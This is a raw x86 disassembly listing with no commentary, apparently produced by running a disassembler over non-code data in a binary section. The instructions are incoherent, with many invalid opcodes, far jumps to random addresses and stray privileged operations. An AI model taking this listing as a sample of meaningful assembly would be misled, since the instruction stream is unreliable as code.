  41a242:	or     bl,bh
  41a244:	test   BYTE PTR [ebx],cl
  41a246:	int3   
  41a247:	mov    al,ds:0xb33404e1
  41a24c:	retf   
  41a24d:	xchg   ebp,eax
  41a24e:	es sti 
  41a250:	push   ebp
  41a251:	xor    al,BYTE PTR [ebx-0x5b02690f]
  41a257:	rcr    BYTE PTR [esi+0x52],cl
  41a25a:	mov    ds:0x327ff42,eax
  41a25f:	mul    dl
  41a261:	xor    bl,BYTE PTR [edx]
  41a263:	out    0x2,al
  41a265:	mov    ah,0xda
  41a267:	in     al,0x61
  41a269:	push   ebx
  41a26a:	mov    edx,0xa7db8548
  41a26f:	test   al,0xc3
  41a271:	mov    edi,0x902272f8
  41a276:	mov    al,0x36
  41a278:	and    eax,0xe4a12884
  41a27d:	push   esi
  41a27e:	push   cs
  41a27f:	sub    esp,esi
  41a281:	and    BYTE PTR [esi+0x6e],ah
  41a284:	mov    al,0x69
  41a286:	hlt    
  41a287:	sub    ecx,DWORD PTR [eax]
  41a289:	sbb    eax,0xe07b7975
  41a28e:	and    ecx,ebp
  41a290:	add    BYTE PTR [edi+0x3a5c2a1a],cl
  41a296:	xchg   edx,eax
  41a297:	jmp    0xf8d47c17
  41a29c:	mov    ebp,0xcc762110
  41a2a1:	call   0x8f80:0xdf007b64
  41a2a8:	loope  0x41a31e
  41a2aa:	(bad)  
  41a2ab:	xor    BYTE PTR [ecx+0x27],dh
  41a2ae:	loope  0x41a26c
  41a2b0:	cmp    al,0x2b
  41a2b2:	mov    ebx,0x63f9b921
  41a2b7:	js     0x41a2b2
  41a2b9:	adc    BYTE PTR [ecx+0x63],0xa2
  41a2bd:	shl    DWORD PTR [edi+0x40d108e],0x4a
  41a2c4:	ja     0x41a24b
  41a2c6:	and    al,0x9c
  41a2c8:	fldenv [edx]
  41a2ca:	mov    eax,0xb0815915
  41a2cf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a2d0:	push   esi
  41a2d1:	test   eax,0xe7332bb
  41a2d6:	dec    ebp
  41a2d7:	sbb    eax,0x21eae0a3
  41a2dc:	mov    esi,edi
  41a2de:	push   edi
  41a2df:	neg    esi
  41a2e1:	ins    DWORD PTR es:[edi],dx
  41a2e2:	sub    al,0x3
  41a2e4:	mov    ecx,DWORD PTR gs:[ecx-0x159d7e87]
  41a2eb:	int3   
  41a2ec:	cwde   
  41a2ed:	mov    al,0xaa
  41a2f0:	add    al,0x2b
  41a2f2:	mov    edi,0xee96d21d
  41a2f7:	aam    0x64
  41a2f9:	fimul  DWORD PTR [esi+0x44]
  41a2fc:	jp     0x41a372
  41a2fe:	lods   eax,DWORD PTR ss:[esi]
  41a300:	push   es
  41a301:	in     eax,dx
  41a302:	jmp    DWORD PTR [ecx+ecx*1]
  41a305:	pop    esi
  41a306:	in     al,0x2d
  41a308:	int3   
  41a309:	push   ss
  41a30a:	sti    
  41a30b:	in     ax,dx
  41a30d:	mov    ah,0xbb
  41a30f:	fwait
	...
  41a374:	neg    DWORD PTR [eax-0x58]
  41a377:	adc    ebp,DWORD PTR [edi+0x15fcfff3]
  41a37d:	pop    esp
  41a37e:	xchg   ebp,eax
  41a37f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a380:	mov    esi,0xe820bf92
  41a385:	adc    eax,0x1040001
  41a38a:	add    BYTE PTR [eax],al
  41a38c:	push   esi
  41a38d:	mov    BYTE PTR [ebp-0x7792f733],bh
  41a393:	adc    eax,0x5ad545e6
  41a398:	rcl    DWORD PTR [esi-0x4d],0x8f
  41a39c:	and    DWORD PTR [ebx],ebx
  41a39e:	call   0x9a9ff48c
  41a3a3:	push   ecx
  41a3a4:	mov    WORD PTR [edi+0xfd937cf],cs
  41a3aa:	add    al,0xf8
  41a3ac:	mov    DWORD PTR [ebp-0x2963fff5],ebp
  41a3b2:	sti    
  41a3b3:	xchg   esp,eax
  41a3b4:	fidiv  DWORD PTR ds:0xa499faef
  41a3ba:	in     al,0x67
  41a3bc:	les    eax,FWORD PTR [ebx+0x77]
  41a3bf:	jbe    0x41a35f
  41a3c1:	sub    eax,0x570e4a45
  41a3c6:	adc    eax,0x98cb8e31
  41a3cb:	call   0x41d7:0x1db62870
  41a3d2:	add    DWORD PTR fs:[esi+0x5f],0x9ae125e3
  41a3da:	xchg   BYTE PTR [ecx-0x6b2277f9],dl
  41a3e0:	push   ecx
  41a3e1:	lods   al,BYTE PTR ds:[esi]
  41a3e2:	lahf   
  41a3e3:	repnz sbb DWORD PTR [ecx+0x6d79e612],esi
  41a3ea:	mov    al,0x65
  41a3ec:	dec    eax
  41a3ed:	and    al,0x6f
  41a3ef:	mov    bh,BYTE PTR [esi]
  41a3f1:	leave  
  41a3f2:	popf   
  41a3f3:	add    al,0xa5
  41a3f5:	dec    esp
  41a3f6:	dec    edx
  41a3f7:	daa    
  41a3f8:	xchg   DWORD PTR [ebp-0x52079853],ecx
  41a3fe:	jmp    0x8a62:0x3015ca5
  41a405:	(bad)  
  41a406:	sub    eax,0x29edf00
  41a40b:	dec    ecx
  41a40c:	sbb    bl,al
  41a40e:	in     al,0x4c
  41a410:	xchg   edi,eax
  41a411:	ror    esp,1
  41a413:	in     eax,0xe0
  41a415:	cmp    al,dl
  41a417:	stos   DWORD PTR es:[edi],eax
  41a418:	neg    edi
  41a41a:	call   0xbb754ccd
  41a41f:	in     eax,dx
  41a420:	xchg   ebp,eax
  41a421:	stc    
  41a422:	call   FWORD PTR [ebx+0x75]
  41a425:	fwait
  41a426:	icebp  
  41a427:	pop    edi
  41a428:	call   0x4be46d83
  41a42d:	xor    eax,0xd39cc075
  41a432:	xchg   edi,eax
  41a433:	dec    ecx
  41a434:	cmp    ecx,DWORD PTR [ecx-0x51de03f7]
  41a43a:	sub    DWORD PTR [ebx],esp
  41a43c:	sub    al,0x3d
  41a43e:	pop    eax
  41a43f:	repz test al,0xca
  41a442:	inc    edx
  41a443:	jno    0x41a4ab
  41a445:	mov    ds:0x403b4c40,eax
  41a44a:	scas   eax,DWORD PTR es:[edi]
  41a44b:	or     eax,0x8dcb45bb
  41a450:	jle    0x41a483
  41a452:	mov    dl,0x89
  41a454:	push   esp
  41a455:	sbb    DWORD PTR [ebx],edx
  41a457:	sbb    BYTE PTR [edx],bh
  41a459:	pavgb  mm4,QWORD PTR [esi]
  41a45c:	mov    ss,WORD PTR [eax+0x42d17d5d]
  41a462:	and    eax,0xba5e5006
  41a467:	push   edx
  41a468:	or     bh,BYTE PTR fs:[ebx-0x5fd6f972]
  41a46f:	rep lods eax,DWORD PTR ds:[esi]
  41a471:	inc    ecx
  41a472:	rcl    BYTE PTR [ecx-0x11],1
  41a475:	arpl   WORD PTR [ecx-0x44f053fb],si
  41a47b:	shl    DWORD PTR [ecx-0x4158ffe6],1
  41a481:	cli    
  41a482:	or     DWORD PTR [eax-0x5f8259eb],edi
  41a488:	call   0xad05:0x2c9d176b
  41a48f:	and    DWORD PTR [eax],eax
	...
  41a4f1:	add    BYTE PTR [eax],al
  41a4f3:	add    BYTE PTR [edi-0xf0307e],bh
  41a4f9:	dec    edi
  41a4fa:	push   DWORD PTR [edx+0x5f4d0d09]
  41a500:	lods   eax,DWORD PTR ds:[esi]
  41a501:	mov    al,0x7a
  41a503:	mov    ds:0x116ec,al
  41a508:	add    al,0x1
  41a50a:	add    BYTE PTR [eax],al
  41a50c:	ja     0x41a526
  41a50e:	push   ds
  41a50f:	mov    dh,0x49
  41a511:	pushf  
  41a512:	jno    0x41a50f
  41a514:	bound  ebx,QWORD PTR [edx+ecx*8-0x73]
  41a518:	aad    0x2
  41a51a:	and    BYTE PTR [ebp-0x3069926],cl
  41a520:	and    BYTE PTR [edx-0x12eb58d1],ah
  41a526:	in     eax,0x59
  41a528:	cmp    esp,DWORD PTR [eax]
  41a52a:	pop    ebx
  41a52b:	std    
  41a52c:	sbb    al,BYTE PTR [edx-0x2cc89f15]
  41a532:	(bad)  
  41a533:	cli    
  41a534:	sahf   
  41a535:	fwait
  41a536:	cdq    
  41a537:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a538:	mov    eax,0x8b7a8414
  41a53d:	stc    
  41a53e:	shl    BYTE PTR [ecx+0x73],0x80
  41a542:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a543:	fidivr WORD PTR [edi-0x31]
  41a546:	aam    0x18
  41a548:	push   cs
  41a549:	add    DWORD PTR ss:[ebx+0xf1dbb63],edx
  41a550:	push   eax
  41a551:	rcr    DWORD PTR [edx-0x24],cl
  41a554:	jmp    DWORD PTR [ebx]
  41a556:	test   al,0x30
  41a558:	addr16 inc ecx
  41a55a:	cdq    
  41a55b:	fidivr DWORD PTR [edi]
  41a55d:	fcompp 
  41a55f:	loop   0x41a55e
  41a561:	nop
  41a562:	dec    ebx
  41a563:	fimul  DWORD PTR [eax-0x55f3fd54]
  41a569:	repz add al,0xa9
  41a56c:	adc    bl,BYTE PTR [ecx+0x6a]
  41a56f:	adc    ch,ch
  41a571:	in     al,0xa2
  41a573:	xor    edx,DWORD PTR [ebx-0x3a]
  41a576:	hlt    
  41a577:	push   0xffffffba
  41a579:	sbb    BYTE PTR [esi-0x761f332a],dl
  41a57f:	jl     0x41a534
  41a581:	into   
  41a582:	inc    edi
  41a583:	xor    eax,0x757c972
  41a588:	xchg   edx,eax
  41a589:	and    eax,0x65ba9f58
  41a58e:	test   eax,0xa28c6ef
  41a593:	sbb    esi,DWORD PTR ds:[esi-0x5f]
  41a597:	mov    dh,0x24
  41a599:	mov    DWORD PTR [edx],edx
  41a59b:	(bad)  
  41a59c:	pusha  
  41a59d:	pop    ecx
  41a59e:	xor    DWORD PTR [eax],0x5b
  41a5a1:	lock push esi
  41a5a3:	jne    0x41a56e
  41a5a5:	pushf  
  41a5a6:	test   BYTE PTR [ebx-0x28],ah
  41a5a9:	outs   dx,BYTE PTR ds:[esi]
  41a5aa:	mov    eax,ds:0xbff1014b
  41a5af:	das    
  41a5b0:	mov    ebx,0xbbe77b42
  41a5b5:	push   0x60
  41a5b7:	lea    edi,[ebp-0x6a0c064]
  41a5bd:	sub    ebp,ecx
  41a5bf:	add    al,0xd5
  41a5c1:	cmp    edx,DWORD PTR [ebx-0x5]
  41a5c4:	mov    eax,0xceb31ab5
  41a5c9:	test   eax,0x5c767a1e
  41a5ce:	imul   edi,DWORD PTR ds:0x3bc25194,0xde9dedc8
  41a5d8:	mov    ss,WORD PTR [esi+0x38dea020]
  41a5de:	fwait
  41a5df:	mov    dl,0x1d
  41a5e1:	sbb    edx,DWORD PTR [ebp-0x54]
  41a5e4:	sub    ah,ah
  41a5e6:	xlat   BYTE PTR ds:[ebx]
  41a5e7:	je     0x41a5f1
  41a5e9:	cld    
  41a5ea:	jno    0x41a622
  41a5ec:	mov    al,0x6b
  41a5ee:	push   ds
  41a5ef:	push   edx
  41a5f0:	cmp    al,dl
  41a5f2:	mov    dl,0x23
  41a5f4:	mov    esp,0x55988d3e
  41a5f9:	sub    eax,0x9c29dc42
  41a5fe:	aaa    
  41a5ff:	pop    ds
  41a600:	jmp    DWORD PTR [edi+0x52]
  41a603:	mov    bl,0xec
  41a605:	iret   
  41a606:	mov    ?,esp
  41a608:	ret    
  41a609:	jmp    0x41a67b
  41a60b:	sbb    eax,0x5f10adcb
	...
  41a674:	pop    esp
  41a675:	sub    al,BYTE PTR [ecx]
  41a677:	inc    ecx
  41a678:	ja     0x41a6e5
  41a67a:	pop    esp
  41a67b:	aas    
  41a67c:	dec    ecx
  41a67d:	push   0x3b6fa625
  41a682:	mov    bl,0x63
  41a684:	lock pop ss
  41a686:	add    DWORD PTR [eax],eax
  41a688:	add    al,0x1
  41a68a:	add    BYTE PTR [eax],al
  41a68c:	adc    DWORD PTR [ebp-0x23],ecx
  41a68f:	push   edx
  41a690:	frstor [ebx+0x15]
  41a693:	or     DWORD PTR [ebx],ebx
  41a695:	and    eax,0x1b54c15d
  41a69a:	mov    bl,0xda
  41a69c:	push   ebx
  41a69d:	mov    bl,BYTE PTR [ebp+0x7f2fe34c]
  41a6a3:	mov    dh,0x66
  41a6a5:	xlat   BYTE PTR ds:[ebx]
  41a6a6:	popa   
  41a6a7:	adc    DWORD PTR [ebp+0x2756bc3c],esi
  41a6ad:	pop    ebp
  41a6ae:	push   esi
  41a6af:	sar    ch,0x18
  41a6b2:	cld    
  41a6b3:	bound  ecx,QWORD PTR [eax+0xa19d125]
  41a6b9:	jp     0x41a687
  41a6bb:	icebp  
  41a6bc:	imul   ebp,DWORD PTR [ebp-0x5b],0xe48e7f81
  41a6c3:	mov    edi,0xc8e472ec
  41a6c8:	cmp    BYTE PTR [ecx],dh
  41a6ca:	cli    
  41a6cb:	jo     0x41a6dc
  41a6cd:	push   ds
  41a6ce:	pop    esi
  41a6cf:	repz xor eax,0xa82bb622
  41a6d5:	lock xchg esp,eax
  41a6d7:	aas    
  41a6d8:	loop   0x41a733
  41a6da:	popa   
  41a6db:	(bad)  
  41a6dc:	int    0xb9
  41a6de:	inc    eax
  41a6df:	(bad)  
  41a6e1:	xlat   BYTE PTR ds:[ebx]
  41a6e2:	stos   BYTE PTR es:[edi],al
  41a6e3:	into   
  41a6e4:	repz cmp al,0xb7
  41a6e7:	xor    esp,DWORD PTR [eax]
  41a6e9:	into   
  41a6ea:	dec    edi
  41a6eb:	pop    edi
  41a6ec:	add    DWORD PTR [eax+0x188ce4f9],ecx
  41a6f2:	xor    DWORD PTR [eax],eax
  41a6f4:	cmc    
  41a6f5:	stc    
  41a6f6:	popf   
  41a6f7:	shl    DWORD PTR [edi],cl
  41a6f9:	jae    0x41a73b
  41a6fb:	dec    DWORD PTR [ebx+0x6f]
  41a6fe:	xchg   edx,eax
  41a6ff:	test   eax,0x2f125a14
  41a704:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a705:	push   0x270d9d9
  41a70a:	mov    dh,0x34
  41a70c:	mov    al,0x9b
  41a70e:	scas   al,BYTE PTR es:[edi]
  41a70f:	or     DWORD PTR [ecx],ebx
  41a711:	icebp  
  41a712:	xlat   BYTE PTR ds:[ebx]
  41a713:	int    0x86
  41a715:	xchg   edx,ebp
  41a717:	fcomi  st,st(2)
  41a719:	dec    eax
  41a71a:	jl     0x41a747
  41a71c:	or     al,0xd0
  41a71e:	mov    edi,0x9867360e
  41a723:	ds mov bh,0x29
  41a726:	dec    edi
  41a727:	xchg   esi,eax
  41a728:	ins    DWORD PTR es:[edi],dx
  41a729:	call   0x7f3b:0x2009c912
  41a730:	not    esp
  41a732:	pop    esp
  41a733:	sub    BYTE PTR [ebx],0x6c
  41a736:	push   ebp
  41a737:	ja     0x41a776
  41a739:	and    eax,0x1e8f6b18
  41a73e:	or     BYTE PTR [ebp-0x31],ah
  41a741:	sub    BYTE PTR [ecx-0x63],ch
  41a744:	sahf   
  41a745:	jnp    0x41a758
  41a747:	xchg   ebp,eax
  41a748:	hlt    
  41a749:	sub    BYTE PTR ds:0xf36953a8,0xd6
  41a750:	dec    esi
  41a751:	pop    ebx
  41a752:	sbb    BYTE PTR [ecx+0x2fc5e495],0xc6
  41a759:	pop    ds
  41a75a:	rcl    esi,0xe7
  41a75d:	(bad)  
  41a75f:	fwait
  41a760:	push   ecx
  41a761:	mov    ebx,0x44ddbb8f
  41a766:	stos   DWORD PTR es:[edi],eax
  41a767:	add    ch,0x73
  41a76a:	sub    dl,BYTE PTR [eax-0x4e735548]
  41a770:	and    eax,DWORD PTR [ecx-0x68]
  41a773:	inc    ebx
  41a774:	fisttp QWORD PTR [edx-0x3f]
  41a777:	ret    0x32e5
  41a77a:	int    0x68
  41a77c:	fcmove st,st(0)
  41a77e:	sub    eax,0x8e2fa01e
  41a783:	enter  0x1231,0x6f
  41a787:	mov    ah,0x66
  41a789:	sbb    al,BYTE PTR es:[edx+0x2e94b87b]
	...
  41a7f4:	repz xchg edi,eax
  41a7f6:	jae    0x41a77f
  41a7f8:	ja     0x41a7e1
  41a7fa:	div    edi
  41a7fc:	mov    ds:0x535327ca,al
  41a801:	mov    BYTE PTR [esp+edi*8-0xc],dl
  41a805:	sbb    BYTE PTR [ecx],al
  41a807:	add    BYTE PTR [ecx+eax*1],al
  41a80a:	add    BYTE PTR [eax],al
  41a80c:	jbe    0x41a79d
  41a80e:	pop    edi
  41a80f:	dec    eax
  41a810:	lahf   
  41a811:	scas   eax,DWORD PTR es:[edi]
  41a812:	inc    esp
  41a813:	lods   eax,DWORD PTR ds:[esi]
  41a814:	mov    edi,0x119bec87
  41a819:	cmp    eax,0x29ca5e22
  41a81e:	push   esi
  41a81f:	jmp    0x3ecdea1e
  41a824:	dec    ebp
  41a825:	pop    es
  41a826:	push   edx
  41a827:	jne    0x41a855
  41a829:	add    ch,BYTE PTR [edi+0x5704c717]
  41a82f:	jne    0x41a7fa
  41a831:	push   ebx
  41a832:	popf   
  41a833:	jne    0x41a873
  41a835:	mov    eax,ds:0xe893133a
  41a83a:	mov    ecx,0x94c55a0
  41a83f:	jae    0x41a877
  41a841:	ret    
  41a842:	aad    0x7e
  41a844:	xchg   DWORD PTR [edx+eax*2+0x22379b70],esp
  41a84b:	push   0x4fb5c6c9
  41a850:	loopne 0x41a80a
  41a852:	div    DWORD PTR [eax-0x1026c0b8]
  41a858:	lahf   
  41a859:	ret    
  41a85a:	push   ss
  41a85b:	lahf   
  41a85c:	or     eax,0x8abaf09f
  41a861:	popa   
  41a862:	pop    edi
  41a863:	mov    eax,ds:0xef1745f4
  41a868:	stos   BYTE PTR es:[edi],al
  41a869:	mov    ebp,0x8479ac9e
  41a86e:	inc    eax
  41a86f:	jns    0x41a8f0
  41a871:	jle    0x41a829
  41a873:	xchg   edx,eax
  41a874:	inc    eax
  41a875:	jno    0x41a8a4
  41a877:	pop    esp
  41a878:	xor    al,0x7e
  41a87a:	pop    ss
  41a87b:	test   BYTE PTR cs:[eax],bl
  41a87e:	and    dh,BYTE PTR [ecx-0x27a02220]
  41a884:	adc    dl,bh
  41a886:	call   0xc76d:0xef934738
  41a88d:	(bad)  
  41a88e:	pop    eax
  41a88f:	inc    eax
  41a890:	xchg   edx,eax
  41a891:	push   eax
  41a892:	ret    
  41a893:	push   edx
  41a894:	leave  
  41a895:	rcr    BYTE PTR [esi],0x6a
  41a898:	lahf   
  41a899:	bound  ebp,QWORD PTR [esi]
  41a89b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a89c:	push   esp
  41a89d:	adc    BYTE PTR [edi],ch
  41a89f:	shr    DWORD PTR [ebx-0x40],1
  41a8a2:	mov    BYTE PTR [ecx],dl
  41a8a4:	jnp    0x41a907
  41a8a6:	scas   al,BYTE PTR es:[edi]
  41a8a7:	mov    ?,WORD PTR [eax+0x6a]
  41a8aa:	pusha  
  41a8ab:	leave  
  41a8ac:	cdq    
  41a8ad:	hlt    
  41a8ae:	ret    0xc51d
  41a8b1:	cmp    esp,esp
  41a8b3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a8b4:	sar    DWORD PTR [edx],cl
  41a8b6:	sub    dh,cl
  41a8b8:	push   ebx
  41a8b9:	lock or DWORD PTR [esi+0x34],edi
  41a8bd:	rep stos BYTE PTR es:[edi],al
  41a8bf:	shl    BYTE PTR [esi],cl
  41a8c1:	test   BYTE PTR [edx-0x36],dl
  41a8c4:	mov    edi,0x849909d3
  41a8c9:	mov    edi,0x905b64b0
  41a8ce:	mov    ds:0x7889dc0e,eax
  41a8d3:	lds    esp,FWORD PTR [edi-0x7b]
  41a8d6:	adc    BYTE PTR [ecx-0x5f],ah
  41a8d9:	adc    cl,BYTE PTR [edi+0x3557b127]
  41a8df:	xchg   edi,eax
  41a8e0:	les    edi,FWORD PTR [ecx]
  41a8e2:	repz dec edi
  41a8e4:	(bad)  
  41a8e6:	inc    DWORD PTR [ecx]
  41a8e8:	fcom   QWORD PTR [ebx-0x9]
  41a8eb:	sub    esp,DWORD PTR ds:0xea21e19
  41a8f1:	repz xchg ebx,eax
  41a8f3:	xchg   DWORD PTR [edx+0x0],esp
  41a8f6:	mov    al,0xda
  41a8f8:	js     0x41a96a
  41a8fa:	mov    al,ds:0x827aa7ed
  41a8ff:	cdq    
  41a900:	arpl   si,di
  41a902:	dec    esp
  41a903:	push   eax
  41a904:	cmp    DWORD PTR [esp+esi*4-0x39],0xa4c931e1
  41a90c:	in     eax,0x4e
  41a90e:	sbb    al,BYTE PTR [edx]
	...
  41a974:	xor    eax,0xcf4a867e
  41a979:	cli    
  41a97a:	std    
  41a97b:	jg     0x41a9cb
  41a97d:	push   edx
  41a97e:	pushf  
  41a97f:	dec    esp
  41a980:	pop    ebp
  41a981:	pop    ds
  41a982:	test   al,0x90
  41a984:	clc    
  41a985:	sbb    DWORD PTR [ecx],eax
  41a987:	add    BYTE PTR [ecx+eax*1],al
  41a98a:	add    BYTE PTR [eax],al
  41a98c:	push   0xfffffff2
  41a98e:	dec    edi
  41a98f:	xor    cl,BYTE PTR [ebx-0x12f6a57]
  41a995:	(bad)  
  41a996:	mov    ah,0xfe
  41a998:	retf   
  41a999:	push   cs
  41a99a:	and    al,0x91
  41a99c:	sub    DWORD PTR [eax],ebp
  41a99e:	(bad)  
  41a99f:	sar    DWORD PTR [esi+ecx*1],cl
  41a9a2:	mov    dh,0x44
  41a9a4:	aas    
  41a9a5:	in     al,0xf0
  41a9a7:	mov    al,0x57
  41a9a9:	mov    edx,0x1b8a351f
  41a9ae:	shr    ah,0x61
  41a9b1:	in     eax,0x26
  41a9b3:	cwde   
  41a9b4:	fist   WORD PTR [ebp+0x3cfa6278]
  41a9ba:	rcl    DWORD PTR [ebx+0x283ae950],1
  41a9c0:	addr16 jb 0x41a9ef
  41a9c3:	mov    ah,0xef
  41a9c5:	push   0xe5a9996f
  41a9ca:	jle    0x41a9f1
  41a9cc:	fs push ecx
  41a9ce:	and    BYTE PTR ds:[ebx],bl
  41a9d1:	cmp    BYTE PTR ds:0x849fb640,ch
  41a9d7:	pop    es
  41a9d8:	mov    ds:0xcc1d7080,al
  41a9dd:	mov    ah,0x9
  41a9df:	or     al,0x8
  41a9e1:	xchg   esp,eax
  41a9e2:	mov    ah,0xa5
  41a9e4:	jl     0x41a989
  41a9e6:	jl     0x41a9b1
  41a9e8:	into   
  41a9e9:	jl     0x41aa07
  41a9eb:	sbb    eax,0xdd27b8fb
  41a9f0:	mov    bh,0xea
  41a9f2:	mov    bh,0x9d
  41a9f4:	mov    ds:0xef795adc,eax
  41a9f9:	(bad)  
  41a9fb:	imul   DWORD PTR [eax+ecx*8-0x40]
  41a9ff:	sub    cl,bl
  41aa01:	cs (bad) 
  41aa03:	fdiv   QWORD PTR [ebp-0x1]
  41aa06:	rol    BYTE PTR ds:0xa64a9b67,1
  41aa0c:	cmp    BYTE PTR [edi+0x77362f7f],dh
  41aa12:	mov    ch,0xb3
  41aa14:	cmp    al,0x7f
  41aa16:	push   ebp
  41aa17:	fimul  WORD PTR [edi+0x37d7fd6c]
  41aa1d:	mov    ah,BYTE PTR [eax]
  41aa1f:	push   edi
  41aa20:	retf   
  41aa21:	xchg   esp,eax
  41aa22:	enter  0x9e59,0xea
  41aa26:	sub    DWORD PTR [eax],0x50c33c85
  41aa2c:	mov    eax,0x1ae920ab
  41aa31:	dec    esp
  41aa32:	pop    esp
  41aa33:	or     edx,DWORD PTR [eax-0xb70b6bd]
  41aa39:	mov    bh,0x46
  41aa3b:	shr    DWORD PTR [edx+0x6f],cl
  41aa3e:	jmp    FWORD PTR [ecx]
  41aa40:	stc    
  41aa41:	sbb    al,0x5a
  41aa43:	in     eax,0xc1
  41aa45:	ret    
  41aa46:	mov    dh,BYTE PTR [eax+0x58fb9a33]
  41aa4c:	rol    ah,0xdb
  41aa4f:	push   esp
  41aa50:	dec    edx
  41aa51:	mov    ds:0x82936c87,eax
  41aa56:	ins    BYTE PTR es:[edi],dx
  41aa57:	rol    DWORD PTR [eax+0x3989d2c8],1
  41aa5d:	or     eax,0xf63211e4
  41aa62:	nop
  41aa63:	sti    
  41aa64:	(bad)  
  41aa65:	jmp    0xe341:0x9ac1deec
  41aa6c:	and    al,0xd2
  41aa6e:	nop
  41aa6f:	sahf   
  41aa70:	gs sub eax,0x688e1826
  41aa76:	ja     0x41aabe
  41aa78:	or     cl,dl
  41aa7a:	dec    ebx
  41aa7b:	or     eax,0xa52da63
  41aa80:	xor    eax,0x82255fd7
  41aa85:	adc    edx,DWORD PTR [edx+0x4601025b]
  41aa8b:	jns    0x41aad9
  41aa8d:	in     al,dx
  41aa8e:	movs   DWORD PTR es:[edi],DWORD PTR fs:[esi]
	...
  41aaf4:	test   DWORD PTR [ecx],0xfdfeb4dc
  41aafa:	inc    DWORD PTR [ebx+0x5f]
  41aafd:	sbb    BYTE PTR [esi+0x43],ah
  41ab00:	mov    ds:0xfc8969c7,al
  41ab05:	sbb    al,BYTE PTR [ecx]
  41ab07:	add    BYTE PTR [ecx+eax*1],al
  41ab0a:	add    BYTE PTR [eax],al
  41ab0c:	push   0xfffffff7
  41ab0e:	aad    0x76
  41ab10:	sbb    edi,edx
  41ab12:	cmp    al,0xc3
  41ab14:	xor    dh,BYTE PTR [ebp+ebp*1-0x6e]
  41ab18:	(bad)  
  41ab19:	dec    eax
  41ab1a:	dec    esi
  41ab1b:	je     0x41ab29
  41ab1d:	mov    edi,0xa4611375
  41ab22:	push   0xa738d1df
  41ab27:	fdivr  DWORD PTR [ecx-0x65d4164a]
  41ab2d:	bound  edi,QWORD PTR [edx+0x4b4324d5]
  41ab33:	(bad)  
  41ab34:	and    BYTE PTR [edi],cl
  41ab36:	stc    
  41ab37:	adc    esi,DWORD PTR [esi]
  41ab39:	(bad)  
  41ab3a:	pop    ebx
  41ab3b:	ins    BYTE PTR es:[edi],dx
  41ab3c:	cmp    al,BYTE PTR ds:0x6e2d8063
  41ab42:	jmp    0xf915a593
  41ab47:	add    BYTE PTR [ecx],bh
  41ab49:	fbstp  TBYTE PTR [ebx+eiz*2]
  41ab4c:	or     DWORD PTR [edx],esi
  41ab4e:	xlat   BYTE PTR ds:[ebx]
  41ab4f:	pop    esp
  41ab50:	std    
  41ab51:	jmp    0x41aaf6
  41ab53:	(bad)  
  41ab54:	mov    ebp,0xd9608848
  41ab5a:	mov    ds:0xdddb01fe,eax
  41ab5f:	sub    al,BYTE PTR [edx]
  41ab61:	ds loope 0x41ab9a
  41ab64:	add    dh,BYTE PTR ds:0x8f32ec06
  41ab6a:	loope  0x41ab5a
  41ab6c:	and    eax,0x7ba37548
  41ab71:	repnz mov esi,0x3d7215df
  41ab77:	or     eax,0xdc2755be
  41ab7c:	stos   BYTE PTR es:[edi],al
  41ab7d:	xlat   BYTE PTR ds:[ebx]
  41ab7e:	mov    cl,0x8b
  41ab80:	addr16 stc 
  41ab82:	pusha  
  41ab83:	fcom   DWORD PTR [ebp+0x52]
  41ab86:	xchg   edi,ebp
  41ab88:	add    ecx,DWORD PTR [eax-0x7e4ea581]
  41ab8e:	push   esp
  41ab8f:	rcr    DWORD PTR [esi+0x24638973],1
  41ab95:	cmp    cl,cl
  41ab97:	pop    ebp
  41ab98:	ret    0x1393
  41ab9b:	pusha  
  41ab9c:	sub    eax,0xdd7e8f1c
  41aba1:	jmp    FWORD PTR [edi-0x33]
  41aba4:	push   eax
  41aba5:	outs   dx,BYTE PTR ds:[esi]
  41aba6:	scas   al,BYTE PTR es:[edi]
  41aba7:	jne    0x41ab4a
  41aba9:	in     eax,0xba
  41abab:	sbb    ah,BYTE PTR [esi+0x18286bb3]
  41abb1:	push   ss
  41abb2:	jo     0x41ab75
  41abb4:	mov    ch,0xe5
  41abb6:	int    0xed
  41abb8:	aaa    
  41abb9:	cmp    bh,BYTE PTR [eax+0x6c]
  41abbc:	xor    al,0x69
  41abbe:	xchg   bh,bh
  41abc0:	inc    ecx
  41abc1:	jno    0x41abc7
  41abc3:	lds    esp,FWORD PTR [ecx+0xd]
  41abc6:	nop    DWORD PTR [edx-0x534e8541]
  41abcd:	and    DWORD PTR [edi-0x2b],0xf4278a7d
  41abd4:	bound  ebp,QWORD PTR [ebx]
  41abd6:	push   ecx
  41abd7:	mov    dh,0xc2
  41abd9:	xlat   BYTE PTR ds:[ebx]
  41abda:	retf   
  41abdb:	pop    ss
  41abdc:	lea    eax,[edi-0x5b31eeeb]
  41abe2:	push   esp
  41abe3:	pop    esp
  41abe4:	and    bl,BYTE PTR [edx]
  41abe6:	fwait
  41abe7:	cmp    al,0xb6
  41abe9:	cwde   
  41abea:	cmp    DWORD PTR [esp+eiz*4+0x5ee12b3],edi
  41abf1:	dec    edi
  41abf2:	ds sbb al,0xf0
  41abf5:	call   DWORD PTR [edx+0x14f21af5]
  41abfb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41abfc:	xor    DWORD PTR [ecx],esp
  41abfe:	and    edi,DWORD PTR [ebp+eax*8+0x2b497bbe]
  41ac05:	mov    DWORD PTR [ebx-0x13],esi
  41ac08:	ss sbb eax,0xe6591ce1
  41ac0e:	xchg   esi,eax
  41ac0f:	jp     0x41ac11
	...
  41ac71:	add    BYTE PTR [eax],al
  41ac73:	add    BYTE PTR [edx+0x49],ch
  41ac76:	es cmp al,0x27
  41ac79:	jg     0x41acf5
  41ac7b:	pop    edi
  41ac7c:	or     al,0x44
  41ac7e:	xor    ah,BYTE PTR [ecx+edi*1-0x77]
  41ac82:	or     DWORD PTR [ebp+0x11c00],edx
  41ac88:	add    al,0x1
  41ac8a:	add    BYTE PTR [eax],al
  41ac8c:	cli    
  41ac8d:	lock pop esp
  41ac8f:	inc    edx
  41ac90:	(bad)  
  41ac91:	imul   ebx,edi,0xa9e465a5
  41ac97:	mov    DWORD PTR [edx],ecx
  41ac99:	ja     0x41acd5
